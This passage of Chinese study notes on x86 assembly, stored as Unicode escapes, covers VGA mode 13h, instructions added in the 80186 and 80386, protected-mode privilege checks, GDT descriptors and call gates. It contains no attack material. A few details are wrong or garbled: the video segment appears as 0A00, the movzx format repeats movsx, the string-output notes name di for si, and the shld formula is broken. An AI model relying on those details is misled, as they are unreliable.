\u5206\u8fa8\u7387\u3001256 \u8272\u7684\u6a21\u5f0f\u3002 \u5c4f\u5e55\u4e0a\u7684\u4e00\u4e2a\u70b9\u5bf9\u5e94\u663e\u5361\u5185\u5b58\u4e0a\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u989c\u8272\u3002\u70b9 (x, y) \u4f4d\u4e8e\u5185\u5b58 0A00:[320*y+x] \u7684\u4f4d\u7f6e\uff0c\u989c\u8272\uff1a 0 \u9ed1 1 \u84dd 2 \u7eff 3 \u9752 4 \u7ea2 5 \u6d0b\u7ea2 6 \u68d5 7 \u767d 8 \u7070 9 \u4eae\u84dd A \u4eae\u7eff B \u4eae\u9752 C \u4eae\u7ea2 D \u7d2b E \u9ec4 F \u4eae\u767d \u7f16\u7a0b\u65f6\u8bbe\u7f6e es \u4e3a 0A00h\uff0c\u7136\u540e\u5411 byte ptr es:[...] \u4e2d\u5199\u5165\u989c\u8272\u7801\u5373\u53ef\u66f4\u6539\u67d0\u5904\u50cf\u7d20\u70b9\u989c\u8272 \u518d\u4f7f\u7528 mov ax , 0003 h \u540e int 10 h \u5207\u6362\u56de\u6587\u672c\u6a21\u5f0f 80x86 \u589e\u52a0\u6307\u4ee4 \u00b6 80186 \u00b6 insb 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsb / rep insb \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in al, dx; mov es:[di], al \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a insw 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsw / rep insw \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in ax, dx; mov es:[di], ax \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsb 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsb / rep outsb \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov al, ds:[si]; out al, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsw 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsw / rep outsw \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov ax, ds:[si]; out ax, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a pusha 80186 \u6307\u4ee4\u683c\u5f0f \uff1apusha \u6307\u4ee4\u4f5c\u7528 \uff1apush \u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a ax cx dx bx sp bp si di popa 80186 \u6307\u4ee4\u683c\u5f0f \uff1apopa \u6307\u4ee4\u4f5c\u7528 \uff1apop \u5230\u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a di si bp sp bx dx cx ax \u7acb\u5373\u6570\u8bed\u6cd5\u6269\u5c55 80186 push \u53ef\u4ee5\u76f4\u63a5\u63a5\u7acb\u5373\u6570 imul shl shr sal sar rol ror rcl rcr \u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570 80286 \u00b6 80286 \u589e\u52a0\u4e86\u4fdd\u62a4\u6a21\u5f0f\u53ca\u76f8\u5173\u6307\u4ee4\uff0c\u4e0d\u5199\u5728\u8fd9\u91cc\u4e86 80386 \u00b6 80386\uff08\u5373 i386\uff09\u5347\u7ea7\u5230\u4e86 32 \u4f4d\u67b6\u6784\uff0c\u5bc4\u5b58\u5668\u5747\u53d8\u4e3a 32 \u4f4d\uff08\u4ee5 e \u5f00\u5934\uff09\uff0c\u589e\u52a0\u4e86 fs gs \u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\u3002\u4e00\u4e9b\u6307\u4ee4\u4ece 8086 \u81ea\u7136\u6269\u5c55\u652f\u6301 32 \u4f4d\uff0c\u4e0d\u5728\u6b64\u8d58\u8ff0 bit \u76f8\u5173\u6307\u4ee4 \u00b6 bt 80386 \u6307\u4ee4\u683c\u5f0f \uff1abt src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF bts 80386 \u6307\u4ee4\u683c\u5f0f \uff1abts src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and set) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 1 \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF btr 80386 \u6307\u4ee4\u683c\u5f0f \uff1abtr src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and reset) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 0 \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF btc 80386 \u6307\u4ee4\u683c\u5f0f \uff1abtc src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and complement) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u53cd\u8f6c \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF bsf 80386 \u6307\u4ee4\u683c\u5f0f \uff1absf dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(bit scan forward) \u5728 src \u4e2d\u641c\u7d22\u6700\u4f4e\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0 OF DF IF TF SF ZF AF PF CF bsr 80386 \u6307\u4ee4\u683c\u5f0f \uff1absr dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(bit scan reverse) \u5728 src \u4e2d\u641c\u7d22\u6700\u9ad8\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0 OF DF IF TF SF ZF AF PF CF \u6570\u636e\u8f6c\u79fb\u6307\u4ee4 \u00b6 movsx 80386 \u6307\u4ee4\u683c\u5f0f \uff1amovsx dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(move with sign-extension) \u5c06 src \u7b26\u53f7\u6269\u5c55\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -> 16\u30018 -> 32\u300116 -> 32 movzx 80386 \u6307\u4ee4\u683c\u5f0f \uff1amovsx dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(move with zero-extension) \u5c06 src \u96f6\u6269\u5c55\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -> 16\u30018 -> 32\u300116 -> 32 pushad 80386 \u6307\u4ee4\u683c\u5f0f \uff1apushad \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\u538b\u5165\u5806\u6808\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a eax ecx edx ebx esp ebp esi edi \u6ce8\u610f \uff1apusha \u4ecd\u4e3a\u538b\u5165 16 \u4f4d\u5bc4\u5b58\u5668 popad 80386 \u6307\u4ee4\u683c\u5f0f \uff1apopad \u6307\u4ee4\u4f5c\u7528 \uff1apop \u51fa 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a edi esi ebp esp ebx edx ecx eax \u6ce8\u610f \uff1apopa \u4ecd\u4e3a\u5f39\u51fa 16 \u4f4d\u5bc4\u5b58\u5668 pushfd 80386 \u6307\u4ee4\u683c\u5f0f \uff1apushfd \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 eflags \u538b\u5165\u5806\u6808 \u6ce8\u610f \uff1apushf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09 popfd 80386 \u6307\u4ee4\u683c\u5f0f \uff1apopfd \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u5806\u6808\u5f39\u51fa\u5230 eflags \u6ce8\u610f \uff1apopf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09 OF DF IF TF SF ZF AF PF CF lss 80386 \u6307\u4ee4\u683c\u5f0f \uff1alss dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ss:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 lfs 80386 \u6307\u4ee4\u683c\u5f0f \uff1alfs dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 fs:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 lgs 80386 \u6307\u4ee4\u683c\u5f0f \uff1algs dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 gs:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 \u8f6c\u6362\u6307\u4ee4 \u00b6 cdq 80386 \u6307\u4ee4\u683c\u5f0f \uff1acdq \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 eax \u6269\u5145\u4e3a edx:eax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 eax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 edx cwde 80386 \u6307\u4ee4\u683c\u5f0f \uff1acwde \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ax \u7b26\u53f7\u6269\u5145\u4e3a eax \u6ce8\u610f \uff1acwd \u4ecd\u4e3a\u5c06 ax \u6269\u5145\u5230 dx:ax \u8fd0\u7b97\u6307\u4ee4 \u00b6 imul \u8bed\u6cd5\u6269\u5c55 80386 \u6307\u4ee4\u683c\u5f0f \uff1aimul dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08\u652f\u6301\u4f20\u5165\u4e24\u4e2a\u64cd\u4f5c\u6570\uff09dest = dest * src\uff0c\u622a\u53d6\u7ed3\u679c\u7684\u4f4e\u4f4d\u5b58\u5165 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5b58\u50a8\u5355\u5143\u3002\u7ed3\u679c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\u4e58\u6cd5\u548c\u65e0\u7b26\u53f7\u6570\u4e58\u6cd5\u76f8\u540c shld 80386 \u6307\u4ee4\u683c\u5f0f \uff1ashld r1, r2, imm / shld r1, r2, cl \u6307\u4ee4\u4f5c\u7528 \uff1ar1 = r1< >(register_width - cl) \u6ce8\u610f \uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined OF DF IF TF SF ZF AF PF CF shrd 80386 \u6307\u4ee4\u683c\u5f0f \uff1ashrd r1, r2, imm / shrd r1, r2, cl \u6307\u4ee4\u4f5c\u7528 \uff1ar1 = r1>>cl \u2223 r2<<(register_width - cl) \u6ce8\u610f \uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined OF DF IF TF SF ZF AF PF CF set cc \u7c7b\u6307\u4ee4 80386 \u6307\u4ee4\u683c\u5f0f \uff1aset cc dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c cc \u6ee1\u8db3\uff0c\u5219\u5c06\u5b57\u8282 dest \u8bbe\u4e3a 1\uff0c\u5426\u5219\u8bbe\u4e3a 0 \u6ce8\u610f \uff1a cc \u540c j cc \uff0cdest \u4e3a 8 \u4f4d\u5bc4\u5b58\u5668\u6216\u5b57\u8282\u5927\u5c0f\u5b58\u50a8\u5355\u5143 \u5b57\u7b26\u4e32\u7c7b\u6307\u4ee4 \u00b6 \u9488\u5bf9 32 \u4f4d\u65b0\u589e CMPSD LODSD SCASD STOSD MOVSD INSD OUTSD \u4e03\u4e2a\u5b57\u7b26\u4e32\u76f8\u5173\u6307\u4ee4\uff0c\u610f\u4e49\u5747\u548c 8086 / 80186 \u7c7b\u4f3c\uff0c\u4e0d\u518d\u8d58\u8ff0 \u63a7\u5236\u8f6c\u79fb\u6307\u4ee4 \u00b6 \u9488\u5bf9 32 \u4f4d\u65b0\u589e IRETD \u6307\u4ee4\uff08\u4e0e IRET \u76f8\u540c\uff0c\u673a\u5668\u7801\u4e5f\u76f8\u540c\uff09\uff0cJECXZ \u6307\u4ee4\uff08jump if ecx equal zero\uff09\u4e0d\u518d\u8d58\u8ff0 80386 \u4fdd\u62a4\u6a21\u5f0f\u539f\u7406 \u00b6 \u5b9e\u6a21\u5f0f\u4e0e\u4fdd\u62a4\u6a21\u5f0f\u7684\u533a\u522b \u00b6 \u5b9e\u6a21\u5f0f\uff08real mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5747\u4e3a 16 \u4f4d \u6bb5\u5730\u5740*10h + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 10000h \u5b57\u8282 \u6bcf\u4e2a\u6bb5\u540c\u65f6\u5177\u6709 Read Write eXecute \u5c5e\u6027 \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6ca1\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u90fd\u662f ring0\uff08\u6700\u9ad8\u6743\u9650\uff09 \u4fdd\u62a4\u6a21\u5f0f\uff08protected mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u662f 16\u4f4d:16\u4f4d \u4e5f\u53ef\u4ee5\u662f 16\u4f4d:32\u4f4d gdt[\u6bb5\u5730\u5740].base_addr + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 4G \u5b57\u8282 \u6570\u636e\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u8bfb\u3001\u8bfb\u5199 \u4ee3\u7801\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u6267\u884c\u4e0d\u53ef\u8bfb\u3001\u53ef\u6267\u884c\u53ef\u8bfb \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e3a ring0\uff0c\u7528\u6237\u4ee3\u7801\u4e3a ring3 \u963b\u6b62 ring3 \u7684\u4ee3\u7801\u8bbf\u95ee ring0 \u7684\u6570\u636e\uff1a mov ax , \u6bb5\u5730\u5740 mov ds , ax ; \u8fd9\u4e00\u6b65\u4f1a\u88ab\u9650\u5236 mov ebx , \u504f\u79fb\u5730\u5740 mov al , ds :[ ebx ] \u5f53\u6bb5\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u7684\u65f6\u5019\uff0cCPU \u4f1a\u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u628a\u5f53\u524d cs \u7684\u4f4e 2 \u4f4d\u548c\u6bb5\u5730\u5740\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u6240\u5305\u542b\u7684 DPL \u8fdb\u884c\u6bd4\u8f83\u5982\u679c \u201ccs.cpl <= \u6bb5\u5730\u5740->\u63cf\u8ff0\u7b26.DPL\u201d \u5219\u5141\u8bb8\u8bbf\u95ee\uff0c\u5426\u5219\u4ea7\u751f General Protection Fault CPL\uff08current privilege level\uff09\u5373 cs \u7684\u4f4e 2 \u4f4d\uff0c\u8868\u793a\u5f53\u524d\u7a0b\u5e8f\u7684\u6743\u9650\uff0cDPL\uff08descriptor privilege level\uff09\u8868\u793a\u6bb5\u5730\u5740\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684\u6743\u9650\u3002\u610f\u4e49\u5373\u662f ring?\uff0c\u6570\u5b57\u8d8a\u5c0f\u6743\u9650\u8d8a\u5927 \u6bb5\u63cf\u8ff0\u7b26 \u00b6 gdt\uff08global descriptor table\uff09\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\uff0c\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u5747\u4e3a 8 \u5b57\u8282\u3002 \u7a0b\u5e8f\u4e2d\u7684\u6bb5\u5730\u5740\u5b9e\u9645\u4e0a\u53eb selector\uff0cselector \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u4e3a gdt+(selector&0FFF8h) \u5904\u7684 8 \u5b57\u8282\uff08\u5373\u4e22\u6389 selector \u7684\u4f4e 3 \u4f4d\uff09 gdt+00h gdt+08h +---+---+-base_addr--+ | | | | -- -- -- -- gdt+10h FF, FF, 00, 80, 0B, F3, 0F, 00 ; \u6574\u4f53 8 \u5b57\u8282\u662f\u6bb5\u5730\u5740 10h \u7684\u63cf\u8ff0\u7b26\uff08descriptor\uff09 ~~ ~~ == ^~ +---+---------------|---|+ | | +-- Granularity = bit 7 | +-- DPL = bit 6, 5 = 11 +-- limit || || 1111 0011 <- 0F |--| | || | | | |+-- Accessed | | | +-- bit 1 | | +-- bit 3 | +-- S +-- Present = bit 7 gdt+18h \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u7b2c 6\u30015 \u4e2a bit \u4e3a DPL \u4f8b\u4e0a\u9762 10h \u6bb5\u7684 DPL \u4e3a 11b \u5373 3\uff08F3 -> 1 11 1 0011\uff09 \u7b2c 2\u30013\u30014\u30017 \u4e2a\u5b57\u8282\u4e3a\u6bb5\u8d77\u59cb\u5730\u5740 base_addr\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6bb5\u8d77\u59cb\u5730\u5740\u4e3a 000B8000h \u7b2c 0\u30011 \u4e2a\u5b57\u8282\u548c\u7b2c 6 \u4e2a\u5b57\u8282\u7684\u540e\u534a\u4e2a\u5b57\u8282\u4e3a\u6700\u5927\u504f\u79fb\u5730\u5740 limit\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6700\u5927\u504f\u79fb\u5730\u5740\u4e3a 0FFFFFh\uff0c\u6700\u5c0f\u504f\u79fb\u5730\u5740\u4e3a 0\uff0c\u6240\u4ee5\u6bb5\u957f\u5ea6\u4e3a 100000h \u5373 1M \u7b2c 6 \u4e2a\u5b57\u8282\u7684\u7b2c 7 \u4e2a bit \u4e3a\u7c92\u5ea6 Granularity\uff0c\u5f53\u8be5\u4f4d\u4e3a 1 \u65f6\uff0climit \u7684\u5355\u4f4d\u53d8\u6210 page\uff08\u9875\uff0c\u4e00\u9875\u4e3a 4k=1000h \u5b57\u8282\uff09 \u4f8b\u5982\u5982\u679c limit \u4e3a FFFFF\uff0cG \u4e3a 1\uff0c\u5219\u6700\u5927\u504f\u79fb\u5730\u5740\u53d8\u4e3a FFFFFFFF\uff08\u6700\u540e\u4e00\u9875\u7684\u5730\u5740\u4e3a [FFFFF000, FFFFFFFF]\uff09 \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u5176\u5b83 bit \u7b2c 7 bit \u4e3a Present\uff0c\u8868\u793a\u8be5\u6bb5\u662f\u5426\u5b58\u5728 \u7b2c 4 bit \u4e3a S\uff0cS = 1 \u8868\u793a\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\uff0c0 \u5219\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26\uff08\u5305\u62ec\u4e0b\u9762\u7684 call gate\uff09 \u7b2c 3 bit \u4e3a 0 \u8868\u793a\u662f\u6570\u636e\u6bb5\uff0c1 \u8868\u793a\u662f\u4ee3\u7801\u6bb5 \u7b2c 1 bit\uff0c\u5982\u679c\u662f\u6570\u636e\u6bb5\uff0c\u5219 1 \u8868\u793a\u53ef\u5199\uff0c\u4ee3\u7801\u6bb5\u65f6 1 \u8868\u793a\u53ef\u8bfb \u7b2c 0 bit \u4e3a Accessed \u8868\u793a\u63cf\u8ff0\u7b26\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7 \u6bb5\u5730\u5740\uff08\u5176\u5b9e\u53eb selector\uff0910h \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u7684 DPL \u4e3a 11\uff0c\u5373\u6743\u9650\u4e3a ring3\uff08DPL \u4e3a 3\uff08\u6700\u4f4e\uff09\u7684\u65f6\u5019\u6240\u6709\u7a0b\u5e8f\u90fd\u662f\u6709\u6743\u8bbf\u95ee\u7684\uff09 \u5047\u8bbe\u524d\u9762\u90a3\u6bb5\u4ee3\u7801\u4e2d\u8d4b\u503c\u7ed9 ax \u7684\u6bb5\u5730\u5740\u4e3a 10h\uff0ccs \u4e3a 08h\uff080000 10 00 \uff09\uff0c\u5219 cs.cpl = 00\uff0c\u4e8e\u662f cs.cpl < 10h->descriptor.DPL\uff0c\u56e0\u6b64\u5f53\u524d\u7a0b\u5e8f\u6709\u6743\u628a ds \u8d4b\u503c\u4e3a 10h\uff0c\u5373\u6709\u6743\u8bbf\u95ee\u8be5\u6bb5\u4e2d\u7684\u6570\u636e \u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u5c0f\u4e8e\u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL\u3002\u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u4ee3\u7801\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u624d\u80fd jmp\u3001call \u5230\u8be5\u6bb5\u91cc\u9762\u7684\u51fd\u6570 \u5f53\u8bbf\u95ee\u8005\u7684 CPL \u5927\u4e8e\u67d0\u4e2a\u4ee3\u7801\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u65f6\uff0c\u5219\u53ea\u80fd\u7528 call call_gate_selector:0 \u8fd9\u6837\u7684\u65b9\u5f0f\u95f4\u63a5\u8c03\u7528\u8be5\u4ee3\u7801\u6bb5\u4e2d\u7684\u51fd\u6570 call gate \u00b6 call gate \u5373\u8c03\u7528\u95e8\uff0c\u53ef\u4ee5\u770b\u4f5c\u4f4e\u6743\u9650\u8c03\u7528\u9ad8\u6743\u9650\u51fd\u6570\u7684\u8df3\u677f\u3002\u5b83\u672c\u8eab\u9700\u8981\u7528 8 \u4e2a\u5b57\u8282\u6765\u63cf\u8ff0\uff0c\u683c\u5f0f\u4f8b\u5982\uff1a +---+--------------------+---+-- \u76ee\u6807\u51fd\u6570\u504f\u79fb\u5730\u5740 | | | | -- -- -- -- gdt+20h 78, 56, 08, 00, 02, EC, 34, 12 == == ^^ ~~ | | | | +-------|----|--|---+---- \u5c5e\u6027 | | | +---- \u53c2\u6570\u7684\u4e2a\u6570 | +----+---- \u76ee\u6807\u51fd\u6570\u7684\u6bb5\u5730\u5740\uff08selector\uff09 | EC = 1110 1100 |==^ ---- || | | || | +-- type\uff0c0C \u5373\u8868\u793a\u662f 32 \u4f4d\u8c03\u7528\u95e8 || +-- S = 0\uff0c\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26 |+-- DPL +-- Present \u5f53 gdt \u91cc\u7684 S = 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f\u4e00\u4e2a\u7cfb\u7edf\u63cf\u8ff0\u7b26\u800c\u4e0d\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\u7684\u63cf\u8ff0\u7b26\u3002\u7cfb\u7edf\u63cf\u8ff0\u7b26\u6709 tss\uff08task state segment\uff09\u63cf\u8ff0\u7b26\u3001task gate \u63cf\u8ff0\u7b26\u3001interrupt gate \u63cf\u8ff0\u7b26\u3001trap gate \u63cf\u8ff0\u7b26\u7b49\uff0cS = 0 \u4e14 type = 1100b \u65f6\u5373\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f 32 \u4f4d\u7684\u8c03\u7528\u95e8 \u5c5e\u6027\u4e2d\u7684 DPL \u662f call gate \u81ea\u5df1\u7684\u6743\u9650\u800c\u4e0d\u662f\u76ee\u6807\u51fd\u6570\u7684\u6743\u9650\uff0c\u76ee\u6807\u51fd\u6570\u7684 DPL \u8981\u901a\u8fc7\u7b2c 2\u30013 \u5b57\u8282\u7684 selector \u627e\u5230\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684 DPL \u8c03\u7528 call gate 